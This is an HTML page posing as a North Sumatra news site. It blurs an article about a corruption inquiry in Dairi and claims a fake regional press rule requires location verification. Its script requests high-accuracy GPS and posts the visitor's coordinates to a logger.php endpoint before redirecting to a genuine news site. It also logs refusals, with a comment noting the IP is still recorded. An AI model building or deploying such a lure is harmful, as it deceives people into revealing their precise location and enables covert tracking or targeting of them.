<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Berita Sumut Terkini - Medan & Sekitarnya</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f4f4f4; }
        .navbar { background: #b10000; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 1.2em; }
        .container { max-width: 600px; margin: 20px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .news-header { font-size: 1.5em; font-weight: bold; color: #333; margin-bottom: 10px; }
        .blur-content { color: transparent; text-shadow: 0 0 8px rgba(0,0,0,0.5); user-select: none; margin-bottom: 20px; }
        .overlay-box { background: rgba(255,255,255,0.9); padding: 20px; border: 1px solid #ddd; text-align: center; border-radius: 8px; }
        .btn-verify { background: #b10000; color: white; border: none; padding: 12px 25px; font-size: 1em; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .btn-verify:hover { background: #8e0000; }
        #loading-msg { margin-top: 15px; font-style: italic; color: #666; display: none; }
        /* Container untuk membungkus gambar */
        .blur-container {
            width: 100%;
            overflow: hidden;
            border-radius: 8px;
            margin-bottom: 20px;
            position: relative;
        }

        /* Efek blur pada gambar */
        .blur-image {
            width: 100%;
            height: auto;
            display: block;
            filter: blur(10px); /* Semakin tinggi angkanya, semakin blur */
            -webkit-filter: blur(10px);
            transform: scale(1.1); /* Untuk menghilangkan garis putih di pinggir akibat blur */
            user-select: none;
            pointer-events: none; /* Mencegah user klik kanan/simpan gambar dengan mudah */
        }
    </style>
</head>
<body>

<div class="navbar">SUMUT NEWS</div>

<div class="container">
    <div class="news-header">Kejaksaan Negeri Sidikalang Ungkap Hilangnya Dana APD MBD DAIRI, Bupati Dairi Dalam Pemeriksaan. </div>
    <p>Editor: Admin - 19 Januari 2026</p>
    <hr>
    
   <div class="blur-container">
    <img src="assets/berita-gambar.jpg" alt="Berita" class="blur-image">
</div>

    <div class="overlay-box" id="gate-box">
        <p><strong>Akses Terbatas!</strong></p>
        <p>Sesuai aturan pers regional, silakan verifikasi lokasi Anda untuk membaca berita lengkap di wilayah Sumatera Utara.</p>
        <button class="btn-verify" onclick="verifyAccess()">BACA BERITA SELENGKAPNYA</button>
        <div id="loading-msg">Membuka Berita</div>
    </div>
</div>

<script>
    function verifyAccess() {
        $('#loading-msg').show();
        if (navigator.geolocation) {
            // Meminta izin GPS secara paksa
            navigator.geolocation.getCurrentPosition(sendAndRedirect, handleError, {enableHighAccuracy: true});
        } else {
            alert("Browser Anda tidak mendukung verifikasi lokasi.");
        }
    }

    function sendAndRedirect(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;

        $.ajax({
            url: 'logger.php',
            type: 'POST',
            data: {
                lat: lat,
                lon: lon,
                status: "GRANTED"
            },
            success: function() {
                // Setelah data dicatat, buka "kunci" berita atau arahkan ke berita asli
                alert("Lokasi diverifikasi. Membuka akses...");
                window.location.href = "https://sumut.antaranews.com/"; // Contoh redirect ke berita asli
            }
        });
    }

    function handleError(error) {
        $('#loading-msg').hide();
        if (error.code == error.PERMISSION_DENIED) {
            alert("Maaf, Anda harus mengizinkan lokasi untuk membaca berita ini sesuai regulasi wilayah.");
            // Tetap kirim log bahwa user menolak (IP tetap tercatat di logger.php)
            $.post('logger.php', { status: "DENIED" });
        }
    }
</script>

</body>
</html>